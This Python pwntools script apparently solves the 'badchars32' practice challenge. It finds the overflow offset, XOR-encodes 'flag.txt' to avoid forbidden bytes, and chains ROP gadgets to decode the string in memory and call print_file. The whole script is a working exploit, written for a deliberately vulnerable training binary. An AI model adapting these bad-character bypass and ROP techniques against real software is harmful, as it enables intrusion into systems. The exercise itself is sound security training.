from pwn import *
import warnings
warnings.filterwarnings("ignore")

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-gef
break print_file
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

# fine eip
def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip, alphabet='bcdefhijk') # generate payload with non bad characters 'x', 'g', 'a', '.'
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100, alphabet='bcdefhijk'))
io = start()
info(io.recvline_contains('badchars are'))

rop = ROP(elf)
data_section_address = elf.symbols.data_start
pop_esi_pop_edi_pop_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
mov_edi_esi = elf.symbols.usefulGadgets + 12
xor_ebp_bl = elf.symbols.usefulGadgets + 4
pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)
info("flag.txt XORd with %d: %s", value_to_xor_with, xored_string)

# To reverse the xor() we did with flag.txt, we can run xor on every character of the string
xor_exploit = b""
data_addr_offset = 0
value_to_xor_with = 2
for c in xored_string:
    xor_exploit += pack(pop_ebp)
    xor_exploit += pack(data_section_address + data_addr_offset)
    xor_exploit += pack(pop_ebx)
    xor_exploit += pack(value_to_xor_with)
    xor_exploit += pack(xor_ebp_bl)
    data_addr_offset+=1

# Create rop chain
rop.raw([pop_esi_pop_edi_pop_ebp, xored_string[:4], data_section_address, 0x0, mov_edi_esi])
rop.raw([pop_esi_pop_edi_pop_ebp, xored_string[4:], data_section_address + 0x4, 0x0, mov_edi_esi])
rop.raw(xor_exploit)
rop.print_file(data_section_address)
rop_chain = rop.chain()

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
# flag.txt takes up 64 bit (8 chars, each char uses 2 hexadcimals, each hexadecimal uses 4 bits), hence split into 2 memory sections
payload = flat(
    asm('nop') * eip_offset,  
    rop_chain
)

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
